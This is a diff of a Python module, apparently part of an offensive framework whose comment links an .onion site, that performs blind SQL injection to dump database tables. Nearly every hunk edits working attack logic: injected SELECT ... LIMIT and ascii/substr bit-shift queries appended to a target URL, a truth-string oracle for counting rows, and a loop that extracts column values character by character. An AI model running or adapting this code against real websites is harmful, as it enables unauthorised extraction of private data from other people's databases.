@@ -6,10 +6,9 @@
 # Module written for implementation in WHFramework (http://ljdbosgro7jj4z7r.onion)
 
 import requests
-from itertools import izip_longest as izipl
 
 options = {
-	"target" : "www.example.com/index.php?id=1",
+	"target" : "http://localhost/index.php?id=1",
 	"cookies" : "",
 	"row_condition" : "1",
 	"follow_redirections" : 0,
@@ -20,14 +19,6 @@ options = {
 }
 
 dump = []
-
-def colored(text, color):
-	if (color == "red"):
-		return "\033[91m" + text + "\033[0m"
-	elif (color == "green"):
-		return "\033[92m" + text + "\033[0m"
-	elif (color == "blue"):
-		return "\033[94m" + text + "\033[0m"
 
 def fix_host(host):
     if ((not host.startswith("http://")) and (not host.startswith("https://"))):
@@ -40,17 +31,16 @@ def request(target):
     return requests.get(target, headers=headers, cookies=options["cookies"], allow_redirects=bool(options["follow_redirections"])).text
 
 def getNumberOfRows():
-    count = 1
-    s = ''
+    count = 0
     while True:
-        target = '%s and ((select ascii(substr(count(%s), {index}, 1)) from %s)>>{shift})={result}' % (options['target'], options['columns'].split(',')[0], options['table_name'])
-        target = target.replace('{index}', str(count))
-        char = getChar(target)
-        if char == 1:
-            return int(s)
-        else:
-            s += str(char)
+        target = '%s and (select %s from %s limit {row_index},1)' % (options['target'],options['columns'].split(',')[0] ,options['table_name'])
+        target = target.replace('{row_index}', str(count))
+        response = request(target)
+        if options['truth_string'] in response:
             count += 1
+        else:
+            break
+    return count
 
 def getChar(target):
     otarget = target
@@ -73,8 +63,6 @@ def getChar(target):
 def exploit():
     options["target"] = fix_host(options["target"])
     columns = options['columns'].split(',')
-    for column in columns:
-        dump.append(column)
     if options["row_condition"] != '1':
         for column in columns:
             count = 1
@@ -90,8 +78,7 @@ def exploit():
                     count += 1
             dump.append(s)
     else:
-        no_of_rows = getNumberOfRows()
-        for x in range(no_of_rows):
+        for x in range(getNumberOfRows()):
             for column in columns:
                 count = 1
                 s = ''
@@ -106,9 +93,5 @@ def exploit():
                         count += 1
                         s += str(char)
                 dump.append(s)
-    print colored('[+] Data successfully dumped!', 'green')
-    print colored('[+] Data:', 'green')
-    for cell in izipl(fillvalue='', *[iter(dump)]*(len(columns))):
-        print '\t'.join(cell)
-    return dump #return unformatted dump anyway so that exploit authors can optionally format themselves
-exploit()
+    return dump
+
